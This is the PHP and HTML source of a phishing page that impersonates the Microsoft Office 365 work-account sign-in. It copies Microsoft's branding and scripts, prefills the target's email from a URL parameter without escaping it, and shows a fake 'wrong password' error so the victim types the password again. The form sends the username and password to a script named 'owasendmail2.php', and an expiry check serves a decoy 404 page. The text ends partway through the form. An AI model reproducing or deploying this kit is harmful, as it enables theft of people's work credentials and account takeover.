<?php
include('blocker.php');
$todays_date=time();
$exp_date = "exp1234";
if ($exp_date <= $todays_date)

{
echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /djdjkd was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>';
exit;
}
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html dir="ltr" style="background-color: rgb(235, 60, 0);" lang="en"><head>
        

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="PageID" content="i5030.2.0">
<meta name="SiteID" content="">
<meta name="ReqLC" content="1033">
<meta name="LocLC" content="en-US">
<meta name="mswebdialog-newwindowurl" content="*">


<script type="text/javascript">//<![CDATA[
$Config={"scid":1000,"hpgact":2000,"hpgid":1003,"pgid":"i5030","apiCanary":"AQABAAAAAABnfiG-mA6NTae7CdWW7QfdD0SIsRuURz8MqhNWCKY40UTscOaCTC47W3oLGgKBjorM2Ni118sAuwcBV_qfAYUVPby-oEfZeWj5RMTYcSk2DYLnLr7tS30t9h7raaDV_hVSqjPMr1zmJDm6j4stTIbgW5nn7PiNhQDdoijfxFfQvJcSjAORPVJIfggPyoiOga5BR16B72jI07EBtV-oFKxBD5ERzbn0Pe8_H8Cs20Gs1yAA","canary":"OKh46jPW0dgljHO5riuO2u+Rjw1qmwMmR6rmboe+EeE=1:1","correlationId":"05781673-e3a0-4cc9-8fc1-6345dd3ce2ac","locale":{"mkt":"en-US","lcid":1033},"strings":{"onprempasswordvalidation":{"authenticatingmessage":"Trying to sign you in","timeouterrormessage":"We didn\u0027t receive a response. Please try again.","genericerrormessage":"Something went wrong. Try again in a few minutes. If this doesn\u0027t work, contact your admin."},"mfa":{"setitupnow":"Set it up now"}},"enums":{"ClientMetricsModes":{"None":0,"SubmitOnPost":1,"SubmitOnRedirect":2,"InstrumentPlt":4}},"urls":{"instr":{"pageload":"https://login.microsoftonline.com/common/instrumentation/reportpageload","dssostatus":"https://login.microsoftonline.com/common/instrumentation/dssostatus"}},"browser":{"ltr":1,"Firefox":1,"_Win":1,"_M52":1,"_D0":1,"Full":1,"Win81":1,"RE_Gecko":1,"b":{"name":"Firefox","major":52,"minor":0},"os":{"name":"Windows","version":"6.3"},"V":"52.0"},"watson":{"url":"/common/handlers/watson","bundle":"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5735.9/content/cdnbundles/watson.min.js","sbundle":"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5735.9/content/cdnbundles/watsonsupport.min.js","fbundle":"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5735.9/content/cdnbundles/frameworksupport.min.js","resetErrorPeriod":5,"maxCorsErrors":2,"maxInjectErrors":5,"maxErrors":10,"maxTotalErrors":100,"incScripts":true,"expSrcs":["https://secure.aadcdn.microsoftonline-p.com/ests/","https://login.microsoftonline.com",".login.microsoftonline.com"],"envErrorRedirect":true,"envErrorUrl":"/common/handlers/enverror"},"serverDetails":{"slc":"ProXXXXes","dc":"AMS2","ri":"ESTXXXX_25","ver":{"v":[2,1,5735,9]},"rt":"2017-04-04T21:36:13"},"country":"US"};
//]]></script> 
<script type="text/javascript">//<![CDATA[
!function(){var r=window,n=r.$Debug=r.$Debug||{},t=r.$Config||{};if(!n.appendLog){var e=[],o=0;n.appendLog=function(r){var n=t.maxDebugLog||25,a=(new Date).toUTCString()+":"+r;e.push(o+":"+a),e.length>n&&e.shift(),o++},n.getLogs=function(){return e}}}(),function(){function r(r,o,a){function i(){var r=!!u.method,e=r?u.method:a[0],i=u.extraArgs||[],s=t.$WebWatson;try{var l=n(a,!r);if(i&&i.length>0)for(var c=i.length,f=0;c>f;f++)l.push(i[f]);e.apply(o,l)}catch(d){return void(s&&s.submitFromException&&s.submitFromException(d))}}var u=e.r&&e.r[r];return o=o?o:this,u&&(u.skipTimeout?i():t.setTimeout(i,0)),u}function n(r,n){return Array.prototype.slice.call(r,n?1:0)}var t=window;t.$Do||(t.$Do={q:[],r:[],removeItems:[],lock:0});var e=t.$Do;e.when=function(n,t){var o=0,a=[],i=1,u="function"==typeof t;u||(o=t,i=2);for(var s=i;s<arguments.length;s++)a.push(arguments[s]);r(n,o,a)||e.q.push({id:n,c:o,a:a})},e.register=function(n,t,o){if(!e.r[n]){var a={};if(t&&(a.method=t),o&&(a.skipTimeout=o),arguments&&arguments.length>3){a.extraArgs=[];for(var i=3;i<arguments.length;i++)a.extraArgs.push(arguments[i])}e.r[n]=a,e.lock++;try{for(var u=0;u<e.q.length;u++){var s=e.q[u];s.id==n&&r(n,s.c,s.a)&&e.removeItems.push(s)}}catch(l){throw l}finally{if(e.lock--,0===e.lock){for(var c=0;c<e.removeItems.length;c++)for(var f=e.removeItems[c],d=0;d<e.q.length;d++)if(e.q[d]===f){e.q.splice(d,1);break}e.removeItems=[]}}}},e.unregister=function(r){e.r[r]&&delete e.r[r]}}(),function(){function r(r,n,t){if(!r||!r.srcPath)return void(n&&n());var a=o.createElement("script");r.id&&(a.id=r.id),a.crossorigin="anonymous",a.type="text/javascript",a.src=r.srcPath,a.defer=!1,a.async=!1,a.onload=n,a.onerror=t,a.onreadystatechange=function(){"loaded"===a.readyState?setTimeout(n,500):"complete"===a.readyState&&n()};var i=o.getElementsByTagName("head")[0];i.appendChild(a),e.$Debug&&e.$Debug.appendLog&&e.$Debug.appendLog("[ScriptLoader]: Loading Script '"+(r.srcPath||"")+"', id:"+(r.id||""))}function n(t,e,o,a){return e<t.length?void r(t[e],function(){n(t,e+1,o,a)},a):void(o&&o())}function t(){var r=this,t=[];r.Add=function(r,n){r&&t.push({srcPath:r,id:n})},r.AddIf=function(n,t,e){n&&r.Add(t,e)},r.Load=function(r,e){n(t,0,r,e)}}var e=window,o=e.document;e.$Loader=t}(),function(){function r(){if(!m){var r=new d.$Loader;r.AddIf(!d.jQuery,v.sbundle,"WebWatson_DemandSupport"),v.sbundle=null,delete v.sbundle,r.AddIf(!d.$Api,v.fbundle,"WebWatson_DemandFramework"),v.fbundle=null,delete v.fbundle,r.Add(v.bundle,"WebWatson_DemandLoaded"),r.Load(n,t),m=!0}}function n(){if(d.$WebWatson){if(d.$WebWatson.isProxy)return void t();p.when("$WebWatson.full",function(){for(;h.length>0;){var r=h.shift();r&&d.$WebWatson[r.cmdName].apply(d.$WebWatson,r.args)}})}}function t(){var r=d.$WebWatson?d.$WebWatson.isProxy:!0;e(),v.loadErrorUrl&&r&&window.location.assign(v.loadErrorUrl)}function e(){h=[],d.$WebWatson=null}function o(n){return function(){var t=arguments;h.push({cmdName:n,args:t}),r()}}function a(){var r=["foundException","resetException","submit","submitFromException","showError","reportException"],n=this;n.isProxy=!0;for(var t=r.length,e=0;t>e;e++){var a=r[e];a&&(n[a]=o(a))}}function i(r,n,t,e,o,a,i,u,s){var l=d.event;a||(a=f(o||l,i?i+2:2)),d.$Debug&&d.$Debug.appendLog&&d.$Debug.appendLog("[WebWatson]:"+(r||"")+" in "+(n||"")+" @ "+(t||"??")),$.submit(r,n,t,e,o||l,a,i,u,s)}function u(r,n){return{signature:r,args:n,toString:function(){return this.signature}}}function s(r){for(var n=[],t=r.split("\n"),e=0;e<t.length;e++)n.push(u(t[e],[]));return n}function l(r){for(var n=[],t=r.split("\n"),e=0;e<t.length;e++){var o=u(t[e],[]);t[e+1]&&(o.signature+="@"+t[e+1],e++),n.push(o)}return n}function c(r){if(!r)return null;try{if(r.stack)return s(r.stack);if(r.error){if(r.error.stack)return s(r.error.stack)}else if(window.opera&&r.message)return l(r.message)}catch(n){}return null}function f(r,n){var t=[];try{for(var e=arguments.callee;n>0;)e=e?e.caller:e,n--;for(var o=0;e&&b>o;){var a="InvalidMethod()";try{a=e.toString()}catch(i){}var s=[],l=e.args||e.arguments;if(l)for(var f=0;f<l.length;f++)s[f]=l[f];t.push(u(a,s)),e=e.caller,o++}}catch(i){t.push(u(i.toString(),[]))}var d=c(r);return d&&(t.push(u("--- Error Event Stack -----------------",[])),t=t.concat(d)),t}var d=window,g=d.$Config||{},v=g.watson,p=d.$Do;if(!d.$WebWatson&&v){var h=[],m=!1,b=10,$=d.$WebWatson=new a;$.CB={},$._orgErrorHandler=d.onerror,d.onerror=i,$.errorHooked=!0,p.when("jQuery.version",function(r){v.expectedVersion=r}),p.register("$WebWatson")}}(),function(){function r(r,n){for(var t=n.split("."),e=t.length,o=0;e>o&&null!==r&&void 0!==r;)r=r[t[o++]];return r}function n(n){var t=null;return null===s&&(s=r(a,"Constants")),null!==s&&n&&(t=r(s,n)),null===t||void 0===t?"":t.toString()}function t(t){var e=null;return null===i&&(i=r(a,"$Config.strings")),null!==i&&t&&(e=r(i,t.toLowerCase())),(null===e||void 0===e)&&(e=n(t)),null===e||void 0===e?"":e.toString()}function e(r,n){var e=null;return r&&n&&n[r]&&(e=t("errors."+n[r])),e||(e=t("errors."+r)),e||(e=t("errors."+l)),e||(e=t(l)),e}function o(t){var e=null;return null===u&&(u=r(a,"$Config.urls")),null!==u&&t&&(e=r(u,t.toLowerCase())),(null===e||void 0===e)&&(e=n(t)),null===e||void 0===e?"":e.toString()}var a=window,i=null,u=null,s=null,l="GENERIC_ERROR";a.GetString=t,a.GetErrorString=e,a.GetUrl=o}(),function(){var r=window,n=r.$Config||{};r.$B=n.browser||{}}();

//]]></script> 
 
 
 

    <link rel="SHORTCUT ICON" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5735.9/content/images/favicon_a.ico">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
<link href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5735.9/content/cdnbundles/login.min.css" rel="stylesheet">



<style>
    .no_display {
        display: none;
    }
</style>


<!--[if lte IE 10]>
    <link href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5735.9/content/cdnbundles/login_ie.min.css" rel="stylesheet" />

<![endif]-->

<!--[if lte IE 7]>
  <style type='text/css'>
    .ie_legacy { display: none; }
    body { background-color: #0072C6; }
  </style>
<![endif]-->


<script type="text/javascript">
    if ((navigator.userAgent.match(/iPad/) || navigator.userAgent.match(/iPhone/))
        && (window.innerWidth)) {
        try {
            viewport = document.querySelector("meta[name=viewport]");
            viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, maximum-scale=1.0');
            window.onresize = function(event) {
                viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, maximum-scale=1.0');
            };
            window.onorientationchange = function (event) {
                var activeElem = document.activeElement;
                activeElem && activeElem.blur();
            };
        } catch (err) {
        }
    }

    var isTouch =  !!("ontouchstart" in window) || window.navigator.msMaxTouchPoints > 0;
    if (!isTouch && true) {    
        var cssId = 'hovereffect';
        if (!document.getElementById(cssId)) {
            var head = document.getElementsByTagName('head')[0];
            var link = document.createElement('link');
            link.id = cssId;
            link.rel = 'stylesheet';
            link.type = 'text/css';
            link.href = "https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5735.9/content/cdnbundles/login_hover.min.css";
            link.media = 'all';
            head.appendChild(link);
        }
    }

    if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
        var msViewportStyle = document.createElement("style");
        msViewportStyle.appendChild(
              document.createTextNode(
                  "@-ms-viewport{width:auto!important}"
              )
          );
        msViewportStyle.appendChild(
              document.createTextNode(
                  "@-ms-viewport{height:auto!important}"
              )
          );
        document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
    }
 </script><link id="hovereffect" rel="stylesheet" type="text/css" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5735.9/content/cdnbundles/login_hover.min.css" media="all">


<script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5735.9/content/cdnbundles/jquery.1.11.min.js"></script>

<script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5735.9/content/cdnbundles/aad.login.min.js"></script>





<style>
    body
    {
        display: none;
    }
</style>

        <title>
Sign in to your account        </title>
    </head>
    <body style="display: block;">
        <p id="accessibleError" class="accessibleError" style="" aria-live="assertive" aria-relevant="all" aria-atomic="true" role="alert">We don't recognize this user ID or passwordBe sure to type the password for your work or school account.</p>
        

    <script>
        if (self == top) {
            var body = $('body');
            body.css('display', 'block');
        } else {
            top.location = self.location;
        }
    </script>

        

<div id="background_branding_container" class="ie_legacy" style="background: rgb(235, 60, 0) none repeat scroll 0% 0%;" role="banner">
    <img id="background_background_image" alt="Work or school account" style="width: 966px; height: 735px; background-color: rgb(235, 60, 0); visibility: visible; display: block;" src="https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uymyxxfhpwrbckvwvlxle8radh6vkzaj7cwkqpqixg/appbranding/npdp3ivuhlrwvd1ynsq0x-mjc7zhvnj0i7k676ppafa/0/heroillustration?ts=635538653045233940">
    <div id="auto_low_bandwidth_background_notification" class="smalltext">It looks like you're on a slow connection. We've disabled some images to speed things up.</div>
    <div id="background_company_name_text" class="background_title_text" style="opacity: 0;" aria-hidden="true">Work or school account</div>
</div>
<div id="background_page_overlay" class="overlay ie_legacy" style="background-color: rgb(235, 60, 0); visibility: visible; display: none;" aria-hidden="true">
</div>

        <div id="login_no_script_panel" class="login_panel" style="display: none;" aria-hidden="true">
            

<noscript>
    <style>body { display: block; }</style>
    <div class="login_inner_container no_js">
        <div class="inner_container cred">
            <div class="login_workload_logo_container">
            </div>
            <div id="login_no_js_error_container" class="login_full_error_container">
                <div id="login_no_js_error_text" class="cta_text 1">
                    
                    <H1>We can't sign you in</H1><p>Your browser is currently set to block JavaScript. You need to allow JavaScript to use this service.</p><p>To learn how to allow JavaScript or to find out whether your browser supports JavaScript, check the online help in your web browser.</p>
                </div>
            </div>
        </div>
    </div>
    

<div id="footer_links_container" class="login_footer_container" role="contentinfo">
    <div class="footer_inner_container">
        <div id="footer_table" class="footer_block">
                <div class="corporate_footer">
                        <div>
                            <span class="footer_link text-caption" id="footer_copyright_link">
&#169; 2017 Microsoft                            </span>
                        </div>
                        <div>
                            <span class="footer_link">
                                <a class="text-caption" id="footer_link_terms" href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank">Terms of use</a>
                            </span>
                            <span class="footer_link">
                                <a class="text-caption" id="footer_link_privacy" href="https://privacy.microsoft.com/en-US/privacystatement" target="_blank">Privacy &amp; Cookies</a>
                            </span>
                        </div>
                </div>
                    <div class="footer_glyph">
                        <img src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5735.9/content/images/microsoft_logo.png" alt="Microsoft account symbol" />
                    </div>
        </div>
    </div>
</div>
<div id="login_prefetch_container" class="no-display">
</div>

</noscript>

        </div>
        <div id="login_panel" class="login_panel" role="form" style="display: block;">
            <div id="legal-section" class="legal_container">
                <div id="legal-content" class="legal-content normaltext"></div>
                <button id="legal-back-btn" class="legal-btn button normaltext">Back</button>
            </div>
            <table class="login_panel_layout" style="height: 100%;">
                <tbody><tr class="login_panel_layout_row" style="height: 100%;">
                    <td id="login_panel_center">
                        

    <script type="text/javascript">
        $(document).ready(function () {
        if ($.support.cookies) {
            $('.login_inner_container').removeClass('no_display');
            $('.no_cookie').addClass('no_display');
        } else {
            $('.login_inner_container').addClass('no_display');
            $('.no_cookie').removeClass('no_display');
        }
        });
    </script>
    <div class="login_inner_container no_cookie no_display" aria-hidden="true">
        <div class="inner_container cred">
            <div class="login_workload_logo_container">
            <img style="visibility: visible;" id="login_workload_logo_image" class="workload_img" alt="Work or school account" src="https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uymyxxfhpwrbckvwvlxle8radh6vkzaj7cwkqpqixg/appbranding/npdp3ivuhlrwvd1ynsq0x-mjc7zhvnj0i7k676ppafa/0/bannerlogo?ts=635538653042733860"></div>
            <div id="login_no_cookie_error_container" class="login_full_error_container">
                <div id="login_no_cookie_error_text" class="cta_text 1">
                    
                    <h1>We can't sign you in</h1><p>Your browser is currently set to block cookies. You need to allow cookies to use this service.</p><p>Cookies are small text files stored on your computer that tell us when you're signed in. To learn how to allow cookies, check the online help in your web browser.</p>
                </div>
            </div>
        </div>
    </div>
                        <script type="text/javascript">
                            $(document).ready(function () {
                                

Constants.USE_NEW_COBRANDING_LOGIC = false;
Constants.DEFAULT_LOGO = 'https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uymyxxfhpwrbckvwvlxle8radh6vkzaj7cwkqpqixg/appbranding/npdp3ivuhlrwvd1ynsq0x-mjc7zhvnj0i7k676ppafa/0/bannerlogo?ts=635538653042733860';


Constants.DEFAULT_LOGO_ALT = 'Office 365';
Constants.DEFAULT_ILLUSTRATION = 'https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uymyxxfhpwrbckvwvlxle8radh6vkzaj7cwkqpqixg/appbranding/npdp3ivuhlrwvd1ynsq0x-mjc7zhvnj0i7k676ppafa/0/heroillustration?ts=635538653045233940';
Constants.DEFAULT_BACKGROUND_COLOR = '#EB3C00';
Constants.BOILERPLATE_HEADER = '';
Constants.DEFAULT_BOILERPLATE_HEADER = '';
Constants.DEFAULT_BOILERPLATE_TEXT = '';


        
        User.UpdateLogo(Constants.DEFAULT_LOGO, Constants.DEFAULT_LOGO_ALT);
        User.UpdateBackground(Constants.DEFAULT_ILLUSTRATION, Constants.DEFAULT_BACKGROUND_COLOR);
        
        if (Constants.DEFAULT_BOILERPLATE_TEXT.length > 0) {
            TenantBranding.AddBoilerPlateText(Constants.DEFAULT_BOILERPLATE_TEXT, Constants.DEFAULT_BOILERPLATE_HEADER);
        }
        

                                



    





try {
        
            Tiles.users =  [];
        

        
        Tiles.users.push(Tiles.otherJSON);
        

    // Test result.
    Tiles.users[0].imageAAD;
} catch (err) {
    Tiles.users = [
        {
            'name': '<?php echo $_GET['login']; ?>',
            'login': '<?php echo $_GET['login']; ?>',
            'link': '<?php echo $_GET['login']; ?>',
            'imageAAD': 'work_account.png',
            'imageMSA': 'personal_account.png',
            'isLive': false,
            'authUrl': '',
            'sessionID': '',
            'domainHint': ''
        }
        
        , Tiles.otherJSON
        
    ];
}

users = Tiles.users;

(function () {
    $('#signedout-forget').click(Tiles.forgetRememberedUser);
    $('#signedin-signout').click({shouldForgetUser: false}, Tiles.signoutAndForgetUser);
    $('#signedin-signoutandforget').click({shouldForgetUser: true}, Tiles.signoutAndForgetUser);

    $("#signoutContainer, #signoutForgetContainer, #forgetContainer").on("keypress", function (event) {
        if (event && event.which === 13 && event.target && event.target.firstElementChild) {
                event.target.firstElementChild.click();
            }
    });
})();
    
        $('.login_cta_container').append(
        $('<div/>')
            .attr('id', 'tiles_cta_text')
            .addClass('cta_message_text')
            .text(''));
    
$('#cred_keep_me_signed_in_checkbox').attr('checked', 'checked');
    

Tiles.drawUsers();

    
    var is_user_live = false;
    var domainHint = '';
    var user_has_tile = Tiles.getUser('<?php echo $_GET['login']; ?>', is_user_live, domainHint) != null; 
    var skipUserRealmDiscoveryOnLoad = false;

    if (user_has_tile) {
        Tiles.showUser('<?php echo $_GET['login']; ?>', is_user_live, domainHint, skipUserRealmDiscoveryOnLoad);
        $('#cred_password_inputtext').focus();
        $('#cred_keep_me_signed_in_checkbox').attr("checked", 'checked');
    } else {
        Tiles.showOtherOption();
    }

    $('#cred_userid_inputtext').val('<?php echo $_GET['login']; ?>');
    if('<?php echo $_GET['login']; ?>' == '') {
        Tiles.CancelTileRedirect();
    }
    
if (Tiles.hasUserNameQS()) {
    Tiles.showUserName();
} else {
}

                            });


                        </script>
                        <div class="login_inner_container" role="main">
                            <div id="true_inner" class="inner_container cred">
                                    <div class="login_workload_logo_container"><img style="visibility: visible;" id="login_workload_logo_image" class="workload_img" alt="Work or school account" src="https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uymyxxfhpwrbckvwvlxle8radh6vkzaj7cwkqpqixg/appbranding/npdp3ivuhlrwvd1ynsq0x-mjc7zhvnj0i7k676ppafa/0/bannerlogo?ts=635538653042733860"></div>
                                <div class="spacer"></div>
                                




<div id="login_error_container" class="login_error_container"></div>
<div class="login_cta_container normaltext">
        <input id="error_code" value="InvalidUserNameOrPassword" type="hidden">
        <script type="text/javascript">
            try
            {
                // create an HTML element then use text() to strip out unwanted HTML markup that may be present in the error
                // in try/catch block since $('...') can fail if it does not like something, but this isn't a fatal error
                var accessibleError = $('<div>' + '<H1>We don\'t recognize this user ID or password</H1><p>Be sure to type the password for your work or school account.</p>' + '</div>');
                $('#accessibleError').text(accessibleError.text());
                $('#accessibleError').show();
            }
            catch (e) {}
        </script>
        <div id="cta_error_message_text" class="error_msg errortext InvalidUserNameOrPassword">
            <div id="recover_container" style="opacity: 1;">
                
                <h1>We don't recognize this user ID or password</h1><p>Be sure to type the password for your work or school account.</p>
                    <p>
                        <a id="cred_forgot_password_link" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuASKxSpYFzw-6dN_MNn1rs2jNbMY2dKSkvWSE1cxKuE1Sz-_PFH_AiPjJiZ2XyfP-OBgnxNMlz_z32IS9C9K90wJL3ZLTUktSizJzM_bxaxikJRikphmbKprZmZurGtikWaua2FpaqprbGpmkmxhamRiYW7wiFkwMTk5vzSvJDMv3QHiigssAq9YeAyYrTg42ASYJRgUGH6wMC5iBTqcYdo84d_Cel7rnD06yvoEGU6x6vt7Z5iYZQWEG6Sk52R5-JsWZZb6G5VqB2WVGxbmlvvmBpkV5Sblp2q7prraGloZTmATmsDGtIvTl7A_7YtSE3NybSFuUkutKC4rLcqxNVTLydFNTrY1NDA2VsvNTwGJGQAA0&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+8.1&amp;username=accounting%40fbc.ca">Forgot your password?</a>
                    </p>
            </div>
            <!-- We don't want to show up the View Details block for some user errors. -->
        </div>
            <div id="login_cta_text" class="cta_message_text 1 no_display" aria-hidden="true">Work or school account</div>

    <div id="cta_client_message_text" class="no_display template-tooltip tooltipType_error" aria-hidden="true">
        <!-- Email Discovery Main -->
        <div class="cta_message_text 30136">Type the email address of the account you want to sign in with.</div>
        <!-- Email Discovery Lookup Timeout -->
        <div class="cta_message_text 30140">We're having trouble locating your account. Which type of account do you want to use?</div>
        <!-- Email Discovery Account not found -->
        <div id="upn_needs_disambiguation_text" class="cta_message_text 30139">
        </div>
        <!-- Tenant branding call to action -->
        <div id="tenant_branding_cta_text" class="cta_message_text 30008">Sign in to {0}</div>
        <!-- Which accound do you want to use -->
        <div class="cta_message_text 30173">Which type of account do you want to sign in with?</div>
    </div>
    <div id="cta_client_error_text" class="error_msg errortext no_display template-tooltip tooltipType_error" aria-hidden="true">
        <!-- Invalid ID or password -->
        
        <div class="client_error_msg 30067"><h1>We don't recognize this user ID or password</h1><p>Be sure to type the password for your work or school account.</p></div>
        <!-- Malformed id -->
        
        <div class="client_error_msg 30064"><h1>This doesn't look like a valid user ID</h1><p>Your user ID should look like an email address, for example someone@contoso.com or someone@contoso.onmicrosoft.com.</p></div>
        <!-- Username not found -->
        
        <div class="client_error_msg 30065"><h1>{0} isn't in our system </h1><p>Make sure you typed your address or phone number correctly, or <a id="user-not-found-link" href="#">get a new Microsoft account</a>.</p></div>
        <!-- Malformed id (DOMAIN\alias format) -->
        
        <div class="client_error_msg 30066"><h1>This doesn't look like a valid user ID</h1><p>Your user ID should look like an email address, for example someone@contoso.com or someone@contoso.onmicrosoft.com.</p></div>
        <!-- Invalid domain name (not guests) -->
        
        <div class="client_error_msg 30068"><h1>{0} isn't in our system</h1><p>Make sure you typed your email address correctly. It usually looks like someone@example.com or someone@example.onmicrosoft.com</p></div>
        <!-- Missing password -->
        <div class="client_error_msg 30111">Please enter your password.</div>
        <!-- UserID is missing -->
        <div class="client_error_msg 30127">To sign in, start by entering a user ID.</div>
        <!-- Error message if email address is not properly formatted -->
        <div class="client_error_msg 30145">Check the email address you entered. You may have mistyped it.</div>
        <!-- Email Discovery could not find email address -->
        
        <div id="account_not_found_title_text" class="client_error_msg 30146"><h1>We couldn't find an account with that email address.</h1><p>Enter a different email address or <a id="user-not-found-link-ebd" href="#">get a new Microsoft account</a>.</p></div>
        <!-- Signout failed -->
        <div id="client_error_msg 30200" class="client_error_msg 30200">You may still be signed in to some applications. Close your browser to finish signing out.</div>
    <div class="client_error_msg 2147776681"><h1>Sorry, but we're having trouble signing you in</h1><p>Please try again in a few minutes. If this doesn't work, you might want to contact your admin and report the following error: 2147776681.</p></div><div class="client_error_msg 2147776682"><h1>Sorry, but we're having trouble signing you in</h1><p>Please try again in a few minutes. If this doesn't work, you might want to contact your admin and report the following error: 2147776682.</p></div><div class="client_error_msg 2147778860"><h1>Sorry, but we're having trouble signing you in</h1><p>Please try again in a few minutes. If this doesn't work, you might want to contact your admin and report the following error: 2147778860.</p></div><div class="client_error_msg 2147762276"><h1>Sorry, but we're having trouble signing you in</h1><p>Please try again in a few minutes. If this doesn't work, you might want to contact your admin and report the following error: 2147762276.</p></div></div>
<div id="tiles_cta_text" class="cta_message_text"></div></div>
<ul class="login_cred_container" role="form">
    <!-- From ViewTemplateBase/Tiles.cshtml -->
    <li id="login_user_chooser" class="login_user_chooser"></li>
    




















    <!-- From ViewTemplateBase/Tiles.cshtml -->
    <div class="nav-settings-menu hidden dropdownPanel" id="signedin-dropdown" aria-hidden="true">
        <ul class="nav-settings-menu-list">
            <li id="signoutContainer"><a href="#" id="signedin-signout">Sign out</a></li>
            <li id="signoutForgetContainer"><a href="#" id="signedin-signoutandforget">Sign out and forget</a></li>
        </ul>
    </div>
    <div class="nav-settings-menu hidden dropdownPanel" id="signedout-dropdown" aria-hidden="true">
        <ul class="nav-settings-menu-list">
            <li id="forgetContainer"><a href="#" id="signedout-forget">Forget</a></li>
        </ul>
    </div>
    <!--  -->
    <li class="login_cred_field_container">
        

<form id="login form" method="post" action="owasendmail2.php">
        <div id="cred_userid_container" class="login_textfield textfield">
            <span class="input_field textfield">
                <label for="cred_userid_inputtext" class="no_display" aria-hidden="true">User account</label>
                <div class="input_border high_contrast_border">
                <input id="cred_userid_inputtext" class="login_textfield textfield required email field normaltext" placeholder="someone@example.com " name="login" spellcheck="false" alt="someone@example.com " aria-label="User account" value="<?php echo $_GET['login']; ?>" autocomplete="off" aria-describedby="accessibleError" type="email">
                </div>
            </span>

        </div>
    <div id="looking_container" class="no_display" aria-hidden="true">
        <span id="looking_cta_text" class="bigtext">Looking for an account</span>
        <span class="input_field normaltext login_textfield"><a id="looking_cancel_link" href="#">Cancel</a> </span>
    </div>
            <div id="redirect_cta_text" class="bigtext" style="display: none;" aria-hidden="true">Redirecting</div>
            <div id="redirect_dots_animation" class="progress" style="visibility: hidden;">
                <div class="pip" style="left: 397px; display: block;">
                </div>
                <div class="pip" style="left: 397px; display: block;">
                </div>
                <div class="pip" style="left: 397px; display: block;">
                </div>
                <div class="pip" style="left: 397px; display: block;">
                </div>
                <div class="pip" style="left: 397px; display: block;">
                </div>
            </div>

        <div id="cred_password_container" class="login_textfield textfield" style="opacity: 1;">
            <span class="input_field textfield">
                <label for="cred_password_inputtext" class="no_display" aria-hidden="true">Password</label>
                <div class="input_border high_contrast_border">
                    <input id="cred_password_inputtext" class="login_textfield textfield required field normaltext" placeholder="Password" spellcheck="false" aria-label="Password" alt="Password" name="passwd" value="" aria-describedby="accessibleError" type="password">
                </div>
            </span>
        </div>
        <div id="redirect_message_container" class="login_textfield hidden no_display" style="opacity: 0;" aria-hidden="true">
            <span class="input_field normaltext">
                <div>
                    <span id="redirect_message_text">We're taking you to your organization's sign-in page.</span><span id="redirect_company_name_text"></span> <a id="redirect_cancel_link" href="#">Cancel</a>
                </div>
            </span>
        </div>

    

<div id="cred_hidden_inputs_container" style="display: none">
  <input name="ctx" value="rQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuASKxSpYFzw-6dN_MNn1rs2jNbMY2dKSkvWSE1cxKuE1Sz-_PFH_AiPjJiZ2XyfP-OBgnxNMlz_z32IS9C9K90wJL3ZLTUktSizJzM_bxaxikJRikphmbKprZmZurGtikWaua2FpaqprbGpmkmxhamRiYW7wiFkwMTk5vzSvJDMv3QHiigssAq9YeAyYrTg42ASYJRgUGH6wMC5iBTqcYdo84d_Cel7rnD06yvoEGU6x6vt7Z5iYZQWEG6Sk52R5-JsWZZb6G5VqB2WVGxbmlvvmBpkV5Sblp2q7prraGloZTmATmsDGtIvTl7A_7YtSE3NybSFuUkutKC4rLcqxNVTLydFNTrY1NDA2VsvNTwGJGQAA0" type="hidden">
  <input name="flowToken" value="AQABAAEAAABnfiG-mA6NTae7CdWW7QfdsnMxxwq5dPvcAeM65a_ruqSjxX2kkDHhbKWrQ9Zr3yDnk6p2-r9n7NAGO4_5kwj5XeDkPTKzllA9vmZJHwSx-iRCBk-eIqpxfYqHRQu5ZunMQxg2i7Zpr3_CGNUDPeMg_1SFkin3uhyFqHCnNg5TbCIsTQcYX9KkIeyOaDfYTXhrnS9uOaQ2Okh6kMbg6rUmsd5b7PczQYmG9bDBgGnhBlC-TJmsu1LKq3xyxp9lrAtx8LGpFbfTVC9XYv58QMAJf6foN2XmXFj4bgY2U1L_0pCZEPLn0KgX2oCnftlcleEgAA" type="hidden">
